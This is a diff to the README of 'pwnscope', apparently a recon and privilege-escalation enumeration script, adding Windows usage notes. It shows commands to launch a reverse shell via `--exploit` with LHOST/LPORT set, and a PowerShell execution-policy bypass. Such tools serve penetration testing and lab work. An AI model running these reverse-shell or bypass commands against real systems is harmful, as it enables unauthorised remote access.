@@ -13,6 +13,7 @@ It's designed to run smarter and faster than other recon scripts yet. So just gi
 * Quick system overview (`--short`)
 * Full enumeration including sudo privileges, SUID files, capabilities, cron jobs, network info, and Docker check (`--full`)
 * Minimal reverse shell exploit via bash/sh (`--exploit`) requiring `LHOST` and `LPORT` environment variables
+* Windows: `$env:LHOST` and `$env:LPORT`.
 
 ---
 
@@ -25,8 +26,8 @@ It's designed to run smarter and faster than other recon scripts yet. So just gi
 * Basic utilities like `find`, `ps`, `ss`, `ip`, `free`, `df`, `getcap`
 
 ### Windows OS
-* Admin rights
-* Powershell exec bypass
+* Admin rights (Optional)
+* Powershell exec bypass (`Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass`)
 
 ---
 
@@ -44,6 +45,21 @@ It's designed to run smarter and faster than other recon scripts yet. So just gi
 
 # Minimal reverse shell exploit
 LHOST=10.10.10.4 LPORT=4444 ./pwnscope.sh --exploit
+```
+
+### Windows Powershell
+
+```powershell
+# For bypass Set-ExecutionPolicy:
+powershell -ExecutionPolicy Bypass -File .\pwnscope.ps1 --short
+
+# Full:
+.\pwnscope.ps1 --full
+
+# For using exploiting and Reverse Shell:
+$env:LHOST = "10.10.14.5"
+$env:LPORT = "4444"
+.\pwnscope.ps1 --exploit
 ```
 
 ---
